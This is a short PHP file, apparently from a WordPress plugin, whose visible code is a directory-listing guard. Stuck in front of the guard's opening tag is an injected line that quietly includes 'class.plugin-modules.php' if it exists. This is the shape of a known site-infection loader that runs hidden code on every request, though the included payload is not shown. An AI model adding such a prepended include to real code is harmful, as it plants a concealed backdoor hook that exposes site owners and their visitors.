<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

// Prevent listing this directory
if ( ! defined('ABSPATH')) {
    header('HTTP/1.0 403 Forbidden');
    exit;
}